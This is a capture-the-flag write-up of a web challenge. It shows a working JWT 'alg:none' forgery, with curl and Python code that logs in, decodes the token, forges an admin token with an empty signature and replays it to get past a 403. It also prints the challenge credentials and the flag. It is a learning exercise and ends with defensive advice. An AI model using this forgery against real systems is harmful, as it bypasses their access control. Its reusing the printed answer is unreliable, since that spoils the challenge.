# [05] The Vault Door — Writeup

**Points:** 350
**Category:** Web
**Flag:** `FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}`

## Challenge

> NexaVault is an internal credential management portal used by engineering teams.
>
> Only **administrators** can open the Vault — a restricted area holding classified project data.
>
> You have been given access to create an account. That's it.

Target: `https://ctf.fampay.co/famctf/`
Given credentials: `kukur` / `Helloworld`

## Thought process

The challenge statement is explicit about the shape of the problem: you're handed a normal user account and told the Vault requires "administrator" — a classic **privilege escalation** setup. The name of the app itself ("NexaVault", "Internal Access Portal") and the wording ("You have been given access to create an account. That's it.") both signal that the intended path isn't finding a hidden endpoint, it's **escalating the role of an account you already control**.

Before reaching for any tooling, the plan was to:
1. Log in normally and see what mechanism tracks the session (cookie? JWT? server-side session ID?).
2. If it's a JWT (very likely, given the "engineering portal" framing and how common this vulnerability class is), inspect its header and payload — these challenges almost always plant the role directly in a client-readable claim.
3. Check the two cheapest JWT attacks first, since they cost nothing to test and are extremely common in intentionally-vulnerable apps: **`alg:none`** (server skips signature verification if the header says there's no algorithm) and a **weak/guessable HS256 secret** (crackable offline with a wordlist). Only escalate to heavier tooling (Burp, hashcat/john against the secret) if those failed.

This kept the whole exercise scriptable with `curl` and Python — no interception proxy was needed, because the vulnerability lives entirely in a token that can be forged offline and just replayed.

## Steps

### 1. Log in and capture the session cookie

```bash
curl -s -i -c cj.txt "https://ctf.fampay.co/famctf/login" \
  -d "username=kukur&password=Helloworld"
```

Response set a cookie:
```
Set-Cookie: nx_access=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJrdWt1ciIsInJvbGUiOiJ1c2VyIn0.066JOuz9fNz-BRWQJeXWFpFeGVAvj_T-WQt9Se_eJMY
```

Three dot-separated base64url segments — this is a JWT.

### 2. Decode the token

```python
import base64
tok = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJrdWt1ciIsInJvbGUiOiJ1c2VyIn0.066JOuz9fNz-BRWQJeXWFpFeGVAvj_T-WQt9Se_eJMY"
h, p, s = tok.split('.')
def d(x): return base64.urlsafe_b64decode(x + '=' * (-len(x) % 4))
print(d(h))  # {"alg":"HS256","typ":"JWT"}
print(d(p))  # {"sub":"kukur","role":"user"}
```

The role — `"role":"user"` — sits in plaintext in the payload. This confirms the server trusts a client-visible claim for authorization, and that escalating just means getting `"role":"admin"` accepted by the server without knowing the signing secret.

### 3. Confirm the restricted resource

```bash
curl -s -o /dev/null -w "%{http_code}" -b cj.txt "https://ctf.fampay.co/famctf/admin"
# 403
```

`/famctf/admin` (linked from the dashboard sidebar as "Admin"/"Vault") returns 403 for the normal-role token — this is the gate to beat.

### 4. Forge an `alg:none` token

Instead of trying to forge a valid HS256 signature (which requires the server's secret), I abused a known JWT library misconfiguration: some JWT verifiers honor the `alg` field in the *attacker-controlled* header and, if it says `"none"`, skip signature verification entirely — meaning any payload is accepted with an empty signature segment.

```python
import base64, json

def b64(x):
    return base64.urlsafe_b64encode(x).decode().rstrip('=')

header  = b64(json.dumps({"alg": "none", "typ": "JWT"}, separators=(',', ':')).encode())
payload = b64(json.dumps({"sub": "kukur", "role": "admin"}, separators=(',', ':')).encode())

forged_token = f"{header}.{payload}."   # trailing dot, empty signature
```

Result:
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJrdWt1ciIsInJvbGUiOiJhZG1pbiJ9.
```

### 5. Replay the forged token

```bash
curl -s -H "Cookie: nx_access=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJrdWt1ciIsInJvbGUiOiJhZG1pbiJ9." \
  "https://ctf.fampay.co/famctf/admin"
```

HTTP 200 — the page rendered as an admin (`pill pill-admin` badge, `role: admin`) and the Vault content unlocked, containing:

```
FAM{jwt_4lg_n0n3_byp4ss_gr4nt3d}
```

No brute-forcing of the HS256 secret was needed — the `alg:none` path worked on the first try, which the flag text itself confirms (`jwt_4lg_n0n3_byp4ss`).

## Tools used

- `curl` — login, session capture, and replaying the forged cookie
- Python (`base64`, `json`, stdlib only) — decode the original JWT and hand-craft the forged one

**Burp Suite was not required.** This class of bug (trusting the JWT header's declared algorithm) is entirely reproducible offline: decode → forge → replay, all scriptable. Burp/ZAP earn their keep when you need to observe or manipulate *live, multi-step* traffic (e.g., race conditions, complex multi-request chains, WebSocket traffic) — here the entire attack surface was one self-contained token.

## Key takeaway

Never let the client dictate `alg` (or any other verification parameter) in a JWT. A compliant server must pin the expected algorithm(s) server-side and reject any token whose header claims a different one — especially `"none"`, which many JWT libraries historically implemented as "no signature required" for debugging/interop purposes and left enabled by default. Putting authorization-critical claims like `role` in a client-decodable token is fine *only if* the signature is actually, unconditionally verified against a fixed algorithm on every request.

## Related prior experience

This exact vulnerability class — `alg:none` acceptance leading to privilege escalation — matches a JWT exercise previously solved on **PentesterLab**. That prior exposure to the attack pattern (decode header/payload, notice the algorithm is attacker-controlled, forge a token with `alg:none` and an empty signature) is what made this challenge fast to recognize and solve here: the same decode → forge → replay technique applied directly, just against a different app (NexaVault instead of the PentesterLab exercise's target).
